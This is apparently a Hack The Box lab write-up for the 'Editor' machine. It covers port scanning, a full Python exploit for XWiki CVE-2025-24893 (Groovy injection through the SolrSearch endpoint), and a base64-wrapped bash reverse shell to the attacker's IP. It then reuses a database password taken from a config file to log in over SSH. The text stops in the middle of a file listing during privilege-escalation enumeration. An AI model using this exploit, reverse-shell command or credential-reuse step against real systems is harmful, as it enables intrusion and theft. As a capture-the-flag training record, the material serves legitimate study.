+++
authors = ["Shengtuo Hu"]
title = "Editor"
description = "Hack The Box - Editor"
date = 2026-04-06T17:00:00-07:00
[taxonomies]
tags = ["HackTheBox"]
[extra]
toc = true
toc_sidebar = true
+++

- Editor (Easy): <https://www.hackthebox.com/machines/Editor>
- My notes: <https://github.com/h1994st/HTB/blob/main/Editor.ipynb>

## Port Scanning

Add the mapping from `10.129.231.23` to `editor.htb` in `/etc/hosts`

```bash
# TCP scanning
sudo nmap -vv -sC -sV -T4 -A 10.129.231.23
```

```python
TARGET_IP = "10.129.231.23"
TARGET_HOST = "editor.htb"
OUTPUT_DIR = TARGET_HOST
CREDENTIALS: dict[str, str] = {}
```

```python
from common import scan_ports

print("Scanning TCP ports for IP:", TARGET_HOST)
scan_ports(TARGET_HOST, top_ports=1000)
```

Scanning output:

```txt
Scanning TCP ports for IP: editor.htb
Nmap is installed.
Ports:
{'protocol': 'tcp', 'portid': '22'}
{'name': 'ssh', 'product': 'OpenSSH', 'version': '8.9p1 Ubuntu 3ubuntu0.13', 'extrainfo': 'Ubuntu Linux; protocol 2.0', 'ostype': 'Linux', 'method': 'probed', 'conf': '10'}
{'id': 'ssh-hostkey', 'output': '\n  256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=\n  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM'}
{'protocol': 'tcp', 'portid': '80'}
{'name': 'http', 'product': 'nginx', 'version': '1.18.0', 'extrainfo': 'Ubuntu', 'ostype': 'Linux', 'method': 'probed', 'conf': '10'}
{'id': 'http-server-header', 'output': 'nginx/1.18.0 (Ubuntu)'}
{'id': 'http-methods', 'output': '\n  Supported Methods: GET HEAD'}
{'id': 'http-title', 'output': 'Editor - SimplistCode Pro'}
{'protocol': 'tcp', 'portid': '8080'}
{'name': 'http', 'product': 'Jetty', 'version': '10.0.20', 'method': 'probed', 'conf': '10'}
{'id': 'http-server-header', 'output': 'Jetty(10.0.20)'}
{'id': 'http-cookie-flags', 'output': '\n  /: \n    JSESSIONID: \n      httponly flag not set'}
{'id': 'http-open-proxy', 'output': 'Proxy might be redirecting requests'}
{'id': 'http-webdav-scan', 'output': '\n  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK\n  Server Type: Jetty(10.0.20)\n  WebDAV type: Unknown'}
{'id': 'http-robots.txt', 'output': '50 disallowed entries (40 shown)\n/xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ \n/xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ \n/xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ \n/xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ \n/xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ \n/xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ \n/xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ \n/xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ \n/xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ \n/xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ \n/xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ \n/xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ \n/xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ \n/xwiki/bin/logout/'}
{'id': 'http-methods', 'output': '\n  Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK\n  Potentially risky methods: PROPFIND LOCK UNLOCK'}
{'id': 'http-title', 'output': 'XWiki - Main - Intro\nRequested resource was http://editor.htb:8080/xwiki/bin/view/Main/'}

OS Matches:
{'name': 'Linux 4.15 - 5.19', 'accuracy': '100', 'line': '70534'}
{'name': 'MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)', 'accuracy': '100', 'line': '91792'}
```

From nmap scanning results, we can know

| Port | Service              | Notes                                                                                                                                                     |
| ---- | -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22   | SSH (OpenSSH 8.9p1)  | Ubuntu Linux                                                                                                                                              |
| 80   | HTTP (nginx 1.18.0)  | "Editor - SimplistCode Pro"                                                                                                                               |
| 8080 | HTTP (Jetty 10.0.20) | XWiki instance; WebDAV enabled (PROPFIND, LOCK, UNLOCK); JSESSIONID cookie without httponly flag; 50 disallowed entries in robots.txt under `/xwiki/bin/` |

## Shell as `xwiki`

Exploit `CVE-2025-24893`

- <https://www.exploit-db.com/exploits/52136>
- <https://www.offsec.com/blog/cve-2025-24893/>

```python
import base64
import re

import aiohttp

from common import get_openvpn_utun_ip

XWIKI_HOST = f"wiki.{TARGET_HOST}"
XWIKI_BASE_URL = f"http://{XWIKI_HOST}"

OUTPUT_PATTERN = re.compile(r"RSS feed for search on \[(?P<output>.*?)\]&lt;/title&gt")


async def run_command(
    session: aiohttp.ClientSession, command_str: str, timeout: int = 2
) -> str:
    params: dict[str, str] = {
        "media": "rss",
        "text": "{{async async=false}}{{groovy}}println([%s].execute().text){{/groovy}}{{/async}}"
        % command_str,
    }
    async with session.get(
        "/xwiki/bin/get/Main/SolrSearch",
        params=params,
        raise_for_status=True,
        timeout=aiohttp.ClientTimeout(total=timeout),
    ) as response:
        text = await response.text()
        match = OUTPUT_PATTERN.search(text)
        if match:
            output: str = match.group("output")
            output = output.replace("<br/>", "\n")
            return output.strip()
        raise ValueError("Command output not found in response")


async def run_command_args(
    session: aiohttp.ClientSession, args: list[str], timeout: int = 2
) -> str:
    command = ", ".join(f'"{arg}"' for arg in args)
    return await run_command(session, command, timeout=timeout)


async def exploit_xwiki():
    async with aiohttp.ClientSession(base_url=XWIKI_BASE_URL) as session:
        print("[*] Running command:", "id")
        result = await run_command_args(session, ["id"])
        print("[+] Command output:", result)

        print("[*] Running command:", "whoami")
        result = await run_command_args(session, ["whoami"])
        print("[+] Command output:", result)

        # Get a reverse shell
        lhost = get_openvpn_utun_ip()
        lport = 443
        command = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        encoded_command = base64.b64encode(command.encode()).decode()

        try:
            print("[*] Running command:", command)
            result = await run_command_args(
                session, ["bash", "-c", f"echo {encoded_command} | base64 -d | bash"]
            )
            print("[+] Command output:", result)
        except aiohttp.ClientResponseError as e:
            assert e.status == 504, f"Unexpected error status: {e.status}"
            print("[*] Expected gateway timeout error due to reverse shell:", e)
        except TimeoutError:
            print("[*] Expected timeout error due to reverse shell")


await exploit_xwiki()
```

Output:

```txt
[*] Running command: id
[+] Command output: uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
[*] Running command: whoami
[+] Command output: xwiki
[+] Found OpenVPN process with PID: 46106
[+] Found OpenVPN utun interface: utun7 with IP: 10.10.15.30
[*] Running command: bash -i >& /dev/tcp/10.10.15.30/443 0>&1
[*] Expected timeout error due to reverse shell
```

## Shell as `oliver`

Within the reverse shell, we act as `xwiki`. After searching under `/etc/xwiki` directory, we find something interesting

```shell
$ grep -C 5 -rni password .
./hibernate.cfg.xml-99-         If you want the main wiki database to be different than "xwiki" (or the default schema for schema based
./hibernate.cfg.xml-100-         engines) you will also have to set the property xwiki.db in xwiki.cfg file
./hibernate.cfg.xml-101-    -->
./hibernate.cfg.xml-102-    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
./hibernate.cfg.xml-103-    <property name="hibernate.connection.username">xwiki</property>
./hibernate.cfg.xml:104:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
./hibernate.cfg.xml-105-    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
./hibernate.cfg.xml-106-    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
./hibernate.cfg.xml-107-    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>
./hibernate.cfg.xml-108-
./hibernate.cfg.xml-109-    <property name="hibernate.connection.charSet">UTF-8</property>
...
```

```python
CREDENTIALS["oliver"] = "theEd1t0rTeam99"
```

```python
import asyncssh

from common import get_stdout, hide_flag

USERNAME = "oliver"
if USERNAME not in CREDENTIALS:
    raise ValueError(f"Credentials for user '{USERNAME}' not found")
PASSWORD = CREDENTIALS[USERNAME]

async with asyncssh.connect(TARGET_HOST, username=USERNAME, password=PASSWORD) as conn:
    result = await conn.run("id", check=True)
    print("[+] Current user:", get_stdout(result), end="")

    result = await conn.run("cat user.txt", check=True)
    print("[+] User flag:", hide_flag(get_stdout(result)), end="")

    # find / -perm -4000 -type f 2>/dev/null
    result = await conn.run("find / -perm -4000 -type f 2>/dev/null")
    print(get_stdout(result), end="")

    # find / -group netdata -type f 2>/dev/null
    result = await conn.run("find / -group netdata -type f 2>/dev/null")
    print(get_stdout(result), end="")

    # found interesting netdata stuff
    result = await conn.run("ls -alh /opt/netdata/", check=True)
    print(get_stdout(result), end="")

    result = await conn.run("/opt/netdata/bin/netdata -W buildinfo", check=True)
    print(get_stdout(result), end="")
```

Output:

```txt
[+] Current user: uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
[+] User flag: 92da...1da7
/tmp/bash
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/run/ebpf.pid
/run/netdata/netdata.pid
/opt/netdata/var/cache/netdata/netdata-meta.db
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000007.njf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000010.njf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000005.njfv2
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000008.ndf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000007.njfv2
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000003.ndf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000009.njfv2
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000008.njfv2
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000001.njf
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000012.ndf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000009.njf
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000004.ndf
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000011.ndf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000002.njf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000011.njfv2
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000002.njfv2
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000003.njfv2
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000005.njf
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000002.ndf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000001.njfv2
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000004.njf
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000010.ndf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000012.njf
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000005.ndf
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000007.ndf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000006.njfv2
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000008.njf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000010.njfv2
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000006.njf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000004.njfv2
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000009.ndf
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000001.ndf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000003.njf
/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000006.ndf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000011.njf
/opt/netdata/var/cache/netdata/ml.db
/opt/netdata/var/cache/netdata/netdata-meta.db-shm
/opt/netdata/var/cache/netdata/netdata-meta.db-wal
/opt/netdata/var/cache/netdata/ml.db-wal
/opt/netdata/var/cache/netdata/.keep
/opt/netdata/var/cache/netdata/dbengine-tier2/journalfile-1-0000000001.njf
/opt/netdata/var/cache/netdata/dbengine-tier2/datafile-1-0000000001.ndf
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000007.njf
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000005.njfv2
/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000003.ndf
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000001.njf
/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000004.ndf
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000002.njf
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000002.njfv2
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000003.njfv2
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000005.njf
/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000002.ndf
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000001.njfv2
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000004.njf
/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000005.ndf
/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000007.ndf
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000006.njfv2
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000006.njf
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000004.njfv2
/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000001.ndf
/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000003.njf
/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000006.ndf
/opt/netdata/var/cache/netdata/ml.db-shm
/opt/netdata/var/cache/netdata/context-meta.db-shm
/opt/netdata/var/cache/netdata/context-meta.db
/opt/netdata/var/cache/netdata/context-meta.db-wal
/opt/netdata/var/lib/netdata/dbengine_multihost_size
/opt/netdata/var/lib/netdata/.keep
/opt/netdata/var/lib/netdata/lock/logind.collector.lock
/opt/netdata/var/lib/netdata/lock/systemdunits_service-units.collector.lock
/opt/netdata/var/lib/netdata/netdata_random_session_id
/opt/netdata/var/lib/netdata/netdata.tarball.checksum
/opt/netdata/var/lib/netdata/registry/netdata.public.unique.id
/opt/netdata/var/lib/netdata/.agent_crash
/opt/netdata/var/lib/netdata/netdata.api.key
/opt/netdata/var/lib/netdata/god-jobs-statuses.json
/opt/netdata/var/log/netdata/access.log.1
/opt/netdata/var/log/netdata/debug.log
/opt/netdata/var/log/netdata/.keep
/opt/netdata/var/log/netdata/aclk.log
/opt/netdata/var/log/netdata/access.log
/opt/netdata/usr/libexec/netdata/plugins.d/charts.d.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/slabinfo.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/debugfs.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/apps.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/go.d.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network-helper.sh
/opt/netdata/usr/libexec/netdata/plugins.d/python.d.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ioping.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/perf.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.5.10.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.5.10.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.5.11.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.5.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.5.15.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.4.16.o
